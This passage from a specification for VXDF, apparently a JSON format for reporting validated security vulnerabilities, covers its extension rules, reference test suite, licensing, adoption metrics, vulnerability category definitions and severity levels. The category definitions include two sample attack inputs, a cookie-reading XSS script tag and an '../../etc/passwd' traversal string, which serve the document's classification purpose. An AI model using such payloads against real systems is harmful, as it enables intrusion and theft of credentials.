  "startTime": "2025-05-17T10:00:00Z",

  "endTime": "2025-05-17T10:00:05Z",

  "durationMs": 5000

}

* The VXDF schema itself typically does not validate the internal structure of data within customProperties or x- fields beyond ensuring it's valid JSON. Consumers not aware of specific extensions will typically ignore them.

**Consumer Handling of Extensions:**

* Conforming VXDF consumers **MUST** tolerate the presence of unrecognized keys within customProperties bags.  
* Conforming VXDF consumers **MUST** ignore any x- prefixed fields they do not recognize without erroring, provided the rest of the document is conformant.  
* Consumers **MAY** provide features to generically surface or list unknown extensions (e.g., displaying them in a separate "Additional Information" section).  
* Advanced consumers **MAY** be configured to understand and process specific, documented extensions relevant to their use case.

**Caution:**

* Do not rely on extensions for conveying critical information essential for basic understanding of the vulnerability if sharing VXDF documents with parties who may not be aware of your specific extensions. The core, standardized VXDF fields should always be sufficient for fundamental interoperability.  
* Extensions should enrich, not replace, the standard information.

**Summary:**

The VXDF extension mechanisms (customProperties bags and x- prefixed fields) provide essential flexibility, allowing the standard to accommodate specific organizational or tool-based needs and to foster innovation. This approach ensures that VXDF can be adapted for specialized use cases while maintaining a stable, interoperable core and a pathway for useful extensions to become part of the official standard over time. The VXDF community will play a role in monitoring common extensions and guiding their potential standardization.

# **Appendix G: Reference Test Suite**

To verify implementations of the VXDF v1.0.0 specification and ensure consistency across different tools and platforms, a reference test suite **SHOULD** be developed and maintained alongside the specification. This test suite would typically contain a collection of VXDF JSON example files and potentially automated scripts or guidelines to validate producer and consumer behavior.

**Purposes of the Reference Test Suite:**

* **Validate Parsers/Generators:** Tool developers (both producers and consumers of VXDF) can use the suite to test their VXDF reading, writing, and validation logic against the normative schema and semantic rules.  
* **Prevent Regressions:** As the VXDF specification evolves (e.g., to v1.0.1, v1.1.0), the test suite helps ensure that changes do not inadvertently break compatibility with previously valid documents or common usage patterns where backward compatibility is expected.  
* **Demonstrate Correct Usage:** Valid examples serve as practical illustrations of how to correctly structure VXDF documents for various scenarios.  
* **Clarify Edge Cases and Boundaries:** Test cases can illustrate how to handle tricky, less common, or boundary conditions according to the specification, helping implementers develop more robust tools.

**Contents of the Test Suite:**

The test suite **SHOULD** include, but not be limited to, the following categories of files and checks:

1. Valid VXDF v1.0.0 Example Files:  
   A collection of .vxdf.json files that are fully conformant with the VXDF v1.0.0 normative schema and semantic rules. Each file should have a clear description of the scenario it represents. Examples:

   * valid-minimal-flow.json: A VXDF document with a single ExploitFlow representing a flow-based vulnerability, using only the absolute minimum required fields from the refined schema (e.g., root id, generatedAt, exploitFlows\[0\].id, title, structured severity with only level, category, one evidence item with minimal data).  
   * valid-minimal-nonflow.json: Similar to above, but for a non-flow vulnerability using affectedComponents with minimal required fields.  
   * valid-full-features.json: A comprehensive example showcasing many optional fields and complex structures of the refined schema, including multiple ExploitFlows (both flow-based and non-flow), detailed Location objects with various locationTypes, multiple TraceSteps with evidenceRefs, detailed AffectedComponent objects with PURLs, rich structured severity including full CVSSv3.1 and CVSSv4.0 objects, and multiple Evidence items with diverse evidenceTypes and their fully populated data structures.  
   * valid-multiple-evidence.json: An ExploitFlow with several distinct Evidence items, each with a different evidenceType and correctly structured data, demonstrating the richness of the evidence model.  
   * valid-uuid-formats.json: Correctly formatted UUIDs for VXDFPayload.id, ExploitFlow.id, and Evidence.id.  
   * valid-cvss-variants.json: Examples showing correct usage of both cvssV3\_1 and cvssV4\_0 objects within severity, including presence/absence of optional temporal/environmental metrics.  
   * valid-custom-properties.json: Demonstrates valid use of customProperties bags at various levels (root, ExploitFlow, Evidence, etc.).  
   * valid-x-extensions.json: Demonstrates valid use of x- prefixed extension fields where permitted by the schema.  
   * valid-all-location-types.json: Examples exercising different Location.locationType enum values and their relevant specific properties.  
   * valid-all-component-types.json: Examples exercising different AffectedComponent.componentType enum values.  
   * valid-all-evidence-types.json: A suite of smaller files, each focused on correctly structuring one or two of the defined Evidence.evidenceType values and their corresponding Evidence.data schemas.  
2. Invalid VXDF v1.0.0 Files:  
   A collection of JSON files that intentionally violate specific rules of the VXDF v1.0.0 schema or semantic requirements. These are crucial for testing the robustness of validators and parsers. Examples:

   * invalid-missing-root-id.json: Root id property is missing.  
   * invalid-wrong-vxdfVersion.json: vxdfVersion is not "1.0.0".  
   * invalid-exploitflow-id-not-uuid.json: An ExploitFlow.id is not a valid UUID.  
   * invalid-missing-exploitflow-title.json: A required title in an ExploitFlow is missing.  
   * invalid-severity-not-object.json: ExploitFlow.severity is a string instead of the required object.  
   * invalid-severity-missing-level.json: ExploitFlow.severity.level is missing.  
   * invalid-cvss-vector-malformed.json: Incorrect CVSS vector string format.  
   * invalid-no-evidence.json: An ExploitFlow has an empty evidence array or is missing the evidence property.  
   * invalid-evidence-data-mismatch.json: An Evidence item has an evidenceType (e.g., HTTP\_REQUEST\_LOG) but its data object does not conform to the schema for HttpRequestLogData (e.g., missing method or url).  
   * invalid-evidence-data-wrong-type.json: A field within an Evidence.data structure has an incorrect data type (e.g., HttpRequestLogData.method is an integer).  
   * invalid-bad-enum-value.json: Uses an undefined value for an enumerated field (e.g., severity.level: "EXTREME", evidenceType: "MAGIC\_PROOF", Location.locationType: "CPU\_REGISTER").  
   * invalid-locus-undefined.json: An ExploitFlow provides neither (source AND sink) NOR affectedComponents.  
   * invalid-non-x-extra-field.json: Contains an additional property (not prefixed with x- and not in a customProperties bag) where additionalProperties: false is set in the schema.  
   * invalid-type-mismatch.json: A property expecting an integer receives a string, or an array receives an object, etc.  
3. Boundary and Edge Case Files:  
   Files designed to test parser and consumer resilience and correct handling of less common but valid scenarios:

   * edge-empty-optional-arrays.json: Optional arrays like steps, tags, affectedComponents, correlationGuids are present but empty.  
   * edge-all-optional-fields-null.json: All optional fields that permit null are set to null.  
   * edge-long-strings.json: Contains extremely long (but valid) string values in fields like description, snippet, or Evidence.data fields to test for truncation or buffer issues.  
   * edge-special-characters.json: String fields containing various special characters that require proper JSON escaping (newlines, tabs, quotes, Unicode characters beyond basic ASCII).  
   * edge-zero-steps-in-flow.json: A flow-based vulnerability with source and sink defined but an empty steps array (direct flow).  
   * edge-complex-location-uris.json: Uses complex but valid URIs in Location.uri.  
   * edge-multiple-cwe.json: An ExploitFlow with multiple CWEs listed.  
   * edge-multiple-evidence-refs.json: TraceStep or AffectedComponent objects referencing multiple Evidence.ids.

**Automation:**

* The test suite repository **SHOULD** include automated scripts (e.g., using a common scripting language like Python and a standard JSON Schema validator library) that can:  
  * Iterate through all valid-\*.json files and confirm they pass validation against the normative VXDF v1.0.0 JSON Schema.  
  * Iterate through all invalid-\*.json files and confirm they *fail* validation, ideally capturing the specific validation errors expected.  
* This automation serves as a double-check on the schema itself and provides a quick compliance check for any JSON Schema validator tool or VXDF-consuming implementation.

**Tool Maker Guidance:**

* Producers **SHOULD** use the test suite to verify their output is conformant.  
* Consumers **SHOULD** use the test suite to verify they can correctly parse valid documents (including all features) and gracefully handle or reject invalid documents, reporting appropriate errors.

**Continuous Integration (CI):**

* The VXDF specification project (if hosted in a version control system) **SHOULD** integrate the automated test suite execution into its CI pipeline. Any proposed changes to the schema or specification text that impact conformance **SHOULD** trigger the test suite to catch regressions or unintended compatibility breaks.

**Adding New Tests:**

* The test suite **SHOULD** be a living resource. As new edge cases are discovered, ambiguities in the spec are clarified, or new minor features are added in future patch/minor versions, corresponding test cases should be added to the suite.

**Interoperability Testing:**

* Beyond static file validation, the VXDF community **MAY** organize "plugfests" or interoperability events where different tool implementations (producers and consumers) exchange VXDF documents to ensure semantic interoperability and consistent interpretation.  
* The community **SHOULD** be encouraged to contribute sanitized, real-world VXDF samples (that are conformant) to a shared repository to enrich the test cases and demonstrate diverse usage.

**Performance Considerations:**

* While not a strict conformance aspect for the format itself, the test suite **MAY** include a few very large (but valid) VXDF files (e.g., with thousands of ExploitFlows or very large Evidence.data content) as a "stress test." This helps implementers consider the performance implications of parsing and processing large VXDF documents.

**Usage of Test Suite by Others:**

* Organizations developing or adopting VXDF-supporting tools can incorporate this reference test suite into their own testing processes.  
* Vendors **MAY** state their conformance by referencing their successful passing of the official VXDF reference test suite.

**Conclusion:**

A comprehensive reference test suite is an essential companion to the VXDF v1.0.0 specification. It translates the normative rules and semantic intent of the standard into practical, testable examples and checks. It will evolve with the specification and is critical for ensuring consistency, quality, and widespread, reliable adoption of VXDF. When a tool or system claims to "support VXDF v1.0.0," its ability to correctly process the reference test suite serves as a key verification of that claim.

# **Appendix H: Licensing and Patent Stance**

To encourage broad adoption, the VXDF specification and associated artifacts (schema, documentation, reference code) are made available under liberal terms:

* **Specification Text License:** The text of this specification (and any official translations or versions) is released under a Creative Commons Attribution license (CC BY 4.0) or a similarly permissive license. This means anyone can copy, distribute, and adapt the spec text, as long as they give credit. This is important for transparency and for inclusion in other documentation. (We consider CC BY to allow quoting parts of the spec in software documentation, for instance, with attribution.)

* **Schema and Code License:** The JSON schema and any reference implementation code will be under an OSI-approved open source license, likely MIT or Apache 2.0. These licenses allow integration into both open source and proprietary tools without issue. Apache 2.0, in particular, includes an explicit patent grant which can be reassuring in standards contexts.

* **No Patent Encumbrances:** The VXDF working group operates under a **royalty-free (RF) patent policy**. This means contributors must agree not to assert any patent claims they have that are essential to implementing VXDF. To our knowledge, describing a data flow in JSON is not something patentable in a way that would affect this spec, but this is a standard precaution. If someone believes they have a patent that covers some aspect of VXDF, they are strongly encouraged (or required, depending on the governance rules) to disclose it. The intent is that VXDF can be implemented by anyone without needing to pay royalties or fear legal issues.

* **Contributor Agreement:** Contributors (especially to the spec text or schema) may be asked to sign or agree to a Contributor License Agreement (CLA) or DCO (Developer Certificate of Origin) depending on the hosting organization. This just ensures that anything contributed can be relicensed under the project’s terms. For example, if the spec is under CC BY and code under MIT, the CLA would have the contributor grant those rights.

* **Trademarks:** The name “VXDF” itself might be trademarked by the project to prevent confusion (so that if someone claims something is VXDF compliant, it actually meets the standard). If so, the usage of the term will be allowed in descriptive ways (“supports VXDF”) but not to mislead (one couldn’t fork the spec and still call it VXDF unless it truly complies).

* **Patent Stance Details:** While we don’t anticipate patent issues, the official stance is: VXDF is intended to be a **patent-unencumbered standard**. Any entity that contributes or that is part of the working group is expected to either disclose patents or, by policy, automatically grant a royalty-free license for any necessary patents. If an essential patent were discovered (e.g., someone holds a patent on a “method of representing code flows in JSON”), the working group would attempt to work around it or obtain a license. This is standard for open standards: we want implementers to have clarity and safety.

* **Relationship with other standards:** VXDF might reference other standards like CWE or SARIF. Those references are allowed under fair use or explicit permission (CWE is publicly available, SARIF is OASIS open standard). There is no content copied that would violate licenses; at most, we link or refer. For example, including the list of severity terms or the JSON schema structure is original here, not copied from elsewhere.

* **Licensing of examples and test files:** All example VXDF files, test suite cases, etc., will be under CC0 (public domain dedication) or a very permissive license. This allows people to use those examples in documentation, in tests, or as starting points for their own reports without worrying about copyright. Essentially, we want people to copy the example flows and modify them for their own use if helpful.

In summary, the licensing approach for VXDF is **open and permissive**. We want no barriers for adoption:

* If you’re a vendor: you can implement VXDF in your closed-source product without any licensing trouble (the spec is open, no royalties).

* If you’re an open source project: you can embed the schema or even fork the reference code under MIT/Apache in your project.

* If you’re an academic or trainer: you can reproduce parts of the spec in a textbook or slides (with proper credit).

* If you’re worried about patents: the community stance is to avoid them; by participating, stakeholders agree not to sue implementers over VXDF usage.

This way, the focus can remain on technical excellence and adoption, rather than legal nuances.

# **Appendix I: Success Metrics and Lifecycle Planning**

How do we know if VXDF is succeeding, and what is the plan for its evolution? This appendix outlines some metrics to gauge success and thoughts on managing the standard’s lifecycle in the industry.

**Success Metrics:**

1. **Adoption by Tools:** A primary measure is how many security tools adopt VXDF for output or input. Success would be, for example, within 1-2 years of v1.0, seeing multiple SAST and DAST vendors supporting exporting validated findings as VXDF. Open-source projects (like some OWASP projects, or popular scanners) implementing VXDF is equally important. We might set a goal: *At least 5 major tools or frameworks produce VXDF by the end of next year.* Similarly, integration tools (like vulnerability management platforms, CI pipelines) should be able to consume VXDF.

2. **Community Usage:** Tracking mentions and usage in the community. For instance:

   * Are CTFs or bug bounty programs using VXDF to submit findings?

   * Do companies have VXDF as part of their internal security testing pipeline?

   * Are there talks/blogs about how VXDF helped reduce false positives or improved workflow? Metrics here could be more qualitative: success stories, case studies. We could also watch downloads or traffic if the schema is hosted (e.g., how many times the schema URL is fetched might correlate to usage).

3. **Interoperability Events:** If we organize plugfests or hackathons where multiple implementations exchange VXDF files, success is measured by how smoothly that goes. If 10 different implementations can all read each others’ VXDF files and interpret them correctly, that’s a huge win for standardization. The count of participants in such events or the bug reports from them can be a metric (initially, many issues might be found, but over time fewer indicates maturity).

4. **Reduction in False Positive Workload:** This is more cause-and-effect and harder to measure directly, but if VXDF is doing its job, teams using tools with VXDF should see fewer false positives reaching developers. We might gather anecdotal evidence or surveys:

   * “Before, our static scanner reported 100 issues and only 20 were real. Now, with an automated validation step outputting VXDF, we only see the 20 real ones and fix them faster.” If companies can quantify that (e.g., time to fix vulnerabilities decreased by X%, or security review hours saved), those are strong success indicators. A formal study could be done after enough adoption, to measure mean time to remediate vulnerabilities in workflows that use VXDF vs those that don’t.

5. **Standardization Recognition:** Another metric is whether VXDF becomes recognized or referenced in industry standards or guidelines. For instance, if OWASP or ISO mentions VXDF as a recommended practice for reporting verified code weaknesses, that’s a sign of success. Or if vulnerability coordination bodies (like CERT or Mitre) show interest in using VXDF for certain advisories.

6. **Community Contributions:** Number of contributions to the spec or related tools. An active community (issues filed, extensions proposed, etc.) means the standard is alive and adapting. We can track number of proposals accepted, number of different contributors, etc. If only the original authors ever touch it, that might indicate limited interest; dozens of contributors would indicate widespread engagement.

**Lifecycle Planning:**

* **Short Term (Year 1):** Focus on awareness and pilot implementations. The working group will identify friendly partners (maybe a couple of tool vendors or projects) to implement VXDF and showcase it. Gather feedback from these early adopters to refine the spec if needed in a minor version update. Success in this phase is a stable v1.x that people are happy with.

* **Medium Term (Years 2-3):** Expand adoption. Possibly work on VXDF 2.0 if major new needs arise (for example, if users want to include other kinds of flows like control-flow exploits, or if integration with incident response dictates new fields). Ensure backward compatibility plans (maybe provide converters from v1 to v2 if needed). This phase might also involve formalizing the standard through a body (if not already done).

* **Long Term (Year 5 and beyond):** Ideally, VXDF (or its evolved form) becomes a de facto standard in AppSec. At that point, maintenance becomes about minor improvements and keeping it relevant with technology changes. The lifecycle could involve merging or coordinating with related standards. For instance, if SARIF introduces a profile for "confirmed exploits", maybe VXDF and SARIF converge or cross-reference. Or VXDF could become part of a larger security data exchange framework.

* **Version Sunsetting:** Plan how to handle multiple versions in the wild. Perhaps maintain support for each major version for a certain period (e.g., at least 5 years) so that organizations have time to upgrade. Provide clear migration guides for any breaking changes.

* **Alignment with DevSecOps lifecycle:** As CI/CD and DevOps evolve, ensure VXDF stays aligned. For example, if new practices like “shifting further left” or “autonomous remediation” come in, maybe VXDF needs to provide data for those (like hints for auto-fix? that’s speculative). Keep an eye on industry trends.

* **Feedback Loops:** Continuously solicit feedback through forums, surveys, and direct user interaction. The lifecycle plan should include periodic checkpoints (say annually) to review if VXDF is meeting its goals or if course corrections are needed (perhaps the scope needs to widen or some complexity needs trimming).

* **Promotion and Education:** Part of lifecycle success is making sure new people entering the field learn about VXDF. That might mean adding it to training curricula, writing easy tutorials, and integrating with popular pipelines by default (so that even those who aren’t specifically aware of VXDF still encounter it as a default output format option in tools).

We will consider VXDF truly successful when it’s no longer a novelty: it becomes a routine part of how validated security findings are handled, much like how JSON or YAML output became normal for configuration or how SARIF is now common for static analysis. At that point, the focus shifts to maintenance and incremental improvements, ensuring the format stays useful and doesn’t become obsolete or replaced by something else.

# **Appendix J: `ExploitFlow.category` Recommended Values and Discriptions**

This appendix provides a recommended list of values and their descriptions for the ExploitFlow.category field in the VXDF v1.0.0 specification. While the schema defines this field as a string for flexibility, adherence to this list is **STRONGLY RECOMMENDED** (as per the schema description for ExploitFlow.category) to promote interoperability and consistent classification of validated vulnerabilities. Producers should select the category that most accurately represents the primary nature of the validated exploit.

**INJECTION**

* **Display Name:** Injection  
* **Definition:** Flaws that allow an attacker to send untrusted data to an interpreter, which is then executed or used to alter program execution.  
* **Usage Guidance/Context:** This is a broad category covering various injection types. The specific type of injection (e.g., SQL, NoSQL, OS Command, LDAP, XPath, XXE, Expression Language Injection) should be detailed in the ExploitFlow.title, description, and often reflected in the cwe field.  
* **Typical CWEs:** CWE-77 (Command Injection), CWE-78 (OS Command Injection), CWE-89 (SQL Injection), CWE-90 (LDAP Injection), CWE-91 (XPath Injection), CWE-502 (Deserialization of Untrusted Data \- if leading to injection), CWE-611 (Improper Restriction of XML External Entity Reference \- 'XXE'), CWE-917 (Improper Neutralization of Special Elements used in an Expression Language Statement \- 'Expression Language Injection').  
* **Example Context:** Validated SQL injection allowing data exfiltration; validated OS command injection leading to server compromise.

**BROKEN\_AUTHENTICATION**

* **Display Name:** Broken Authentication  
* **Definition:** Vulnerabilities related to incorrect implementation of authentication mechanisms or session management, allowing attackers to compromise user accounts, passwords, session tokens, or impersonate users.  
* **Usage Guidance/Context:** Covers issues like weak credential handling, session fixation, session hijacking, improper logout, password reset poisoning, missing or weak multi-factor authentication (MFA) where its absence leads to a validated exploit path.  
* **Typical CWEs:** CWE-287 (Improper Authentication), CWE-306 (Missing Authentication for Critical Function), CWE-307 (Improper Restriction of Excessive Authentication Attempts), CWE-384 (Session Fixation), CWE-522 (Insufficiently Protected Credentials), CWE-613 (Insufficient Session Expiration).  
* **Example Context:** A validated exploit showing session tokens are predictable or exposed, allowing an attacker to hijack an active user session.

**SENSITIVE\_DATA\_EXPOSURE**

* **Display Name:** Sensitive Data Exposure  
* **Definition:** Vulnerabilities that lead to the unauthorized disclosure of sensitive information, such as personally identifiable information (PII), financial data, credentials, private keys, or proprietary business information. This can occur for data at rest or in transit.  
* **Usage Guidance/Context:** Focuses on the exposure itself. If the exposure is due to another primary flaw (e.g., SQL Injection leading to data dump), INJECTION might be the primary category, with this as a consequence. However, if the core issue is, for example, data being transmitted unencrypted or stored with weak encryption, this category is appropriate.  
* **Typical CWEs:** CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor), CWE-311 (Missing Encryption of Sensitive Data), CWE-312 (Cleartext Storage of Sensitive Information), CWE-319 (Cleartext Transmission of Sensitive Information), CWE-327 (Use of a Broken or Risky Cryptographic Algorithm \- if leading to exposure).  
* **Example Context:** Validated ability to intercept and read sensitive customer PII transmitted over HTTP; discovery of weakly encrypted backup files containing user passwords that can be easily decrypted.

**BROKEN\_ACCESS\_CONTROL**

* **Display Name:** Broken Access Control  
* **Definition:** Flaws in the enforcement of restrictions on what authenticated users are allowed to do. Attackers can exploit these flaws to access unauthorized functionality or data.  
* **Usage Guidance/Context:** Covers issues like Insecure Direct Object References (IDOR), privilege escalation, missing function-level access control, forceful Browse to restricted pages/APIs, or modification of access control tokens/parameters. This category assumes the user is authenticated but can perform actions beyond their intended privileges.  
* **Typical CWEs:** CWE-22 (Improper Limitation of a Pathname to a Restricted Directory \- 'Path Traversal', if used to bypass access controls), CWE-284 (Improper Access Control), CWE-285 (Improper Authorization), CWE-639 (Authorization Bypass Through User-Controlled Key), CWE-269 (Improper Privilege Management).  
* **Example Context:** A validated exploit where a regular user can access an administrative API endpoint by simply knowing its URL, or can modify another user's data by changing an ID in a request parameter.

**SECURITY\_MISCONFIGURATION**

* **Display Name:** Security Misconfiguration  
* **Definition:** Vulnerabilities arising from insecure default configurations, incomplete or ad-hoc configurations, open cloud storage, misconfigured HTTP headers, unnecessary features enabled, or verbose error messages containing sensitive information.  
* **Usage Guidance/Context:** This is a broad category. If a misconfiguration is highly specific and common (e.g., a missing security header), a more specific category might be used if defined (e.g., a future MISSING\_SECURITY\_HEADER category if added as primary). Includes issues like exposed administration consoles, default credentials unchanged, directory listing enabled on sensitive paths, or overly permissive CORS policies.  
* **Typical CWEs:** CWE-2 (Environmental Security Flaws), CWE-16 (Configuration), CWE-538 (File and Directory Information Exposure), CWE-548 (Exposure of Information Through Directory Listing), CWE-1188 (Insecure Default Initialization of Resource).  
* **Example Context:** A cloud storage bucket configured for public read/write access containing sensitive files; an application server admin console accessible with default credentials.

**CROSS\_SITE\_SCRIPTING**

* **Display Name:** Cross-Site Scripting (XSS)  
* **Definition:** Vulnerabilities that allow attackers to inject malicious client-side scripts into web pages viewed by other users.  
* **Usage Guidance/Context:** Covers Reflected XSS, Stored XSS, and DOM-based XSS. The ExploitFlow.description should specify the type.  
* **Typical CWEs:** CWE-79 (Improper Neutralization of Input During Web Page Generation \- 'Cross-site Scripting').  
* **Example Context:** Validated injection of a \<script\>alert(document.cookie)\</script\> payload into a user profile field, which then executes in the browser of any user viewing that profile.

**INSECURE\_DESERIALIZATION**

* **Display Name:** Insecure Deserialization  
* **Definition:** Flaws that occur when an application deserializes untrusted or manipulated serialized objects, potentially leading to remote code execution, data tampering, or denial of service.  
* **Usage Guidance/Context:** Applies to applications that use serialization for communication, persistence, or other purposes, and fail to properly validate or secure the deserialization process.  
* **Typical CWEs:** CWE-502 (Deserialization of Untrusted Data).  
* **Example Context:** An application deserializes a Java object from an HTTP request, and an attacker crafts a malicious serialized object that, upon deserialization, executes arbitrary commands on the server.

**VULNERABLE\_AND\_OUTDATED\_COMPONENTS**

* **Display Name:** Vulnerable and Outdated Components  
* **Definition:** Vulnerabilities arising from the use of software components (e.g., libraries, frameworks, modules, OS packages) that are outdated, unsupported, or known to contain security weaknesses (e.g., identified by CVEs).  
* **Usage Guidance/Context:** This is the primary category for findings from Software Composition Analysis (SCA) tools, once the exploitability of the component's vulnerability *in the context of the application* has been validated. The ExploitFlow.affectedComponents array is crucial for detailing the specific vulnerable component(s).  
* **Typical CWEs:** CWE-1104 (Use of Unmaintained Third Party Components), CWE-1390 (Weakness in Software Written by Other Kinds of End Users). The CWE of the vulnerability *within* the component (e.g., if Log4j has a CWE-502 due to deserialization issues used by Text4Shell) can also be listed in ExploitFlow.cwe. (Note: CWE-937 is deprecated ).  
* **Example Context:** An application is validated to be exploitable due to its use of an old version of Apache Commons Text that has a known RCE vulnerability (e.g., CVE-2022-42889 "Text4Shell").

**SERVER\_SIDE\_REQUEST\_FORGERY**

* **Display Name:** Server-Side Request Forgery (SSRF)  
* **Definition:** Vulnerabilities that allow an attacker to induce a server-side application to make HTTP requests to an arbitrary domain of the attacker's choosing.  
* **Usage Guidance/Context:** Can be used to scan internal networks, access internal services, interact with cloud provider metadata endpoints, or exfiltrate data.  
* **Typical CWEs:** CWE-918 (Server-Side Request Forgery (SSRF)).  
* **Example Context:** An application feature that fetches content from a user-supplied URL can be manipulated to make requests to internal IP addresses or cloud metadata services, with evidence showing the interaction.

**CRYPTOGRAPHIC\_FAILURE**

* **Display Name:** Cryptographic Failure  
* **Definition:** Vulnerabilities related to the incorrect use, weak implementation, or absence of cryptography, leading to exposure of sensitive data or other security weaknesses. (This category focuses on the *failure of cryptography itself* ).  
* **Usage Guidance/Context:** Covers issues like use of weak/broken cryptographic algorithms, improper key management, missing encryption for sensitive data at rest or in transit (if the failure is specifically cryptographic, otherwise SENSITIVE\_DATA\_EXPOSURE might be more general), use of hardcoded keys, or insufficient randomness.  
* **Typical CWEs:** CWE-310 (Cryptographic Issues), CWE-326 (Inadequate Encryption Strength), CWE-327 (Use of a Broken or Risky Cryptographic Algorithm), CWE-328 (Reversible One-Way Hash), CWE-330 (Use of Insufficiently Random Values), CWE-331 (Insufficient Entropy).  
* **Example Context:** An application stores user passwords using an unsalted MD5 hash; an application uses a hardcoded secret key for encrypting sensitive session data.

**FILE\_AND\_PATH\_MANIPULATION**

* **Display Name:** File and Path Manipulation  
* **Definition:** Vulnerabilities that allow an attacker to manipulate file paths or file operations to access, modify, or delete unauthorized files or directories, or include unintended files for execution.  
* **Usage Guidance/Context:** Covers Path Traversal (Directory Traversal), Local File Inclusion (LFI), and Remote File Inclusion (RFI \- if leading to server-side execution from an external file).  
* **Typical CWEs:** CWE-22 (Improper Limitation of a Pathname to a Restricted Directory \- 'Path Traversal'), CWE-73 (External Control of File Name or Path), CWE-98 (Improper Control of Filename for Include/Require Statement in PHP Program \- 'File Inclusion').  
* **Example Context:** A validated exploit where providing ../../../../etc/passwd as a parameter value allows an attacker to download the system's password file.

**BUSINESS\_LOGIC\_FLAW**

* **Display Name:** Business Logic Flaw  
* **Definition:** Vulnerabilities that arise from flaws in the design or implementation of the application's business logic or workflow, allowing an attacker to elicit unintended behavior or circumvent business rules for malicious gain.  
* **Usage Guidance/Context:** These are often highly application-specific and may not fit standard CWEs easily. The exploit involves manipulating legitimate application functionality in an unforeseen sequence or with unexpected inputs to achieve a malicious outcome not covered by other categories like injection or access control alone.  
* **Typical CWEs:** CWE-840 (Business Logic Errors), CWE-841 (Improper Enforcement of Business Logic).  
* **Example Context:** A validated exploit where an attacker can add an item to a cart, apply a discount meant for another item, and check out at a significantly reduced price due to flawed validation in the checkout workflow.

**DENIAL\_OF\_SERVICE**

* **Display Name:** Denial of Service (DoS)  
* **Definition:** Vulnerabilities that allow an attacker to make a system, application, or network resource unavailable to its intended users, typically by overwhelming it with traffic or by triggering a condition that causes it to crash or become unresponsive.  
* **Usage Guidance/Context:** For VXDF, this should ideally represent a *validated exploit* leading to DoS, not just theoretical resource exhaustion. This could be triggering a specific crash condition, an exponential resource consumption bug (e.g., "billion laughs" for XML), or an asymmetric resource consumption attack.  
* **Typical CWEs:** CWE-400 (Uncontrolled Resource Consumption), CWE-404 (Improper Resource Shutdown or Release), CWE-770 (Allocation of Resources Without Limits or Throttling).  
* **Example Context:** Sending a specifically crafted request that causes an application thread to enter an infinite loop, consuming 100% CPU and making the application unresponsive to other users.

**MEMORY\_CORRUPTION**

* **Display Name:** Memory Corruption  
* **Definition:** Vulnerabilities that allow an attacker to write to, read from, or execute memory in unintended ways, often due to programming errors in languages like C/C++.  
* **Usage Guidance/Context:** Covers buffer overflows (stack, heap), use-after-free, double-free, format string vulnerabilities, integer overflows leading to memory issues, etc.. While often associated with system-level software, these can occur in web applications or services written in or using native code components. Validation often involves causing a crash and analyzing it, or demonstrating controlled memory overwrite.  
* **Typical CWEs:** CWE-119 (Improper Restriction of Operations within the Bounds of a Memory Buffer), CWE-120 (Buffer Copy without Checking Size of Input \- 'Classic Buffer Overflow'), CWE-125 (Out-of-bounds Read), CWE-415 (Double Free), CWE-416 (Use After Free), CWE-134 (Use of Externally-Controlled Format String).  
* **Example Context:** A validated buffer overflow in a file parsing library used by a web application, triggered by uploading a malicious file, leading to a crash (and potentially RCE).

**OTHER\_VULNERABILITY**

* **Display Name:** Other Vulnerability  
* **Definition:** A validated vulnerability that does not clearly fit into any of the other predefined categories.  
* **Usage Guidance:** Use this category sparingly. Before selecting "OTHER", review if the vulnerability could be classified under a more specific existing category, perhaps by considering its root cause or primary impact. When this category is used, the ExploitFlow.title and ExploitFlow.description MUST be very clear and descriptive about the nature of the vulnerability. It might be used for highly novel or application-specific flaws that defy common classifications.  
* **Typical CWEs:** N/A (depends on the specific nature; should be detailed in ExploitFlow.cwe).  
* **Example Context:** A complex timing attack that exploits a very specific, non-standard interaction between multiple custom components in a distributed system, not fitting typical race condition patterns.

(This list provides a foundational set of categories. It can be evolved in future versions of the VXDF specification based on community feedback and emerging vulnerability trends. Producers are encouraged to map their findings to the most appropriate category here to facilitate consistent reporting and analysis.)

# **Appendix K: `Severity.level` \- Definitions**

This appendix provides definitions and usage guidance for the level enumeration values used within the Severity object in the VXDF v1.0.0 specification. The Severity.level provides a qualitative assessment of the urgency and potential impact of a validated vulnerability. While VXDF also supports quantitative scoring via CVSS within the Severity object (see $defs/CvssV3\_1 and $defs/CvssV4\_0 in Appendix A: Normative JSON Schema), this level offers a standardized, human-readable classification. Producers SHOULD align this qualitative level with any provided CVSS scores (e.g., a CVSS Base Score of 9.0-10.0 typically corresponds to "CRITICAL"). If both qualitative level and CVSS scores are present, the Severity.justification field can be used to explain any discrepancies or provide context for the chosen level.

**CRITICAL**

* **Display Name:** Critical  
* **Definition:** Vulnerabilities that, if exploited, are highly likely to result in a widespread, catastrophic impact on the confidentiality, integrity, or availability of the system or its data. Exploitation is often straightforward or can be automated, potentially requiring minimal or no authentication or user interaction.  
* **Usage Guidance:**  
  * Use for vulnerabilities that could lead to complete system compromise, remote code execution with high privileges, large-scale sensitive data exfiltration or destruction, or significant disruption of essential services.  
  * Typically corresponds to the highest range of CVSS scores (e.g., CVSS Base Score 9.0-10.0).  
  * These vulnerabilities demand immediate attention and remediation.  
* **Example Context:** A remote unauthenticated command injection allowing full server takeover; a SQL injection that allows an attacker to dump the entire user database containing PII and credentials.

**HIGH**

* **Display Name:** High  
* **Definition:** Vulnerabilities that can lead to significant impact on the system or data, such as unauthorized access to sensitive information, modification of important data, or disruption of key functionalities. Exploitation might be relatively easy for a skilled attacker, possibly requiring some level of privilege or specific conditions, but the potential consequences are severe.  
* **Usage Guidance:**  
  * Use for vulnerabilities that could result in significant data breaches, privilege escalation to administrator, persistent denial of service, or the ability to execute arbitrary code in a restricted context.  
  * Typically corresponds to upper-mid to high range of CVSS scores (e.g., CVSS Base Score 7.0-8.9).  
  * These vulnerabilities require urgent attention and remediation.  
* **Example Context:** A stored Cross-Site Scripting (XSS) vulnerability on a high-traffic page allowing session hijacking of administrative users; a privilege escalation flaw allowing a regular user to gain administrative rights on a system.

**MEDIUM**

* **Display Name:** Medium  
* **Definition:** Vulnerabilities that could lead to a moderate impact, such as limited information disclosure, partial data modification, or temporary denial of service for some users or functionalities. Exploitation might require more specific conditions, higher attacker skill, or some level of user interaction.  
* **Usage Guidance:**  
  * Use for vulnerabilities that have a noticeable but not catastrophic impact. The exploit might be more complex or less reliable.  
  * Typically corresponds to the middle range of CVSS scores (e.g., CVSS Base Score 4.0-6.9).  
  * These vulnerabilities should be addressed in a timely manner as part of regular patching and development cycles.  
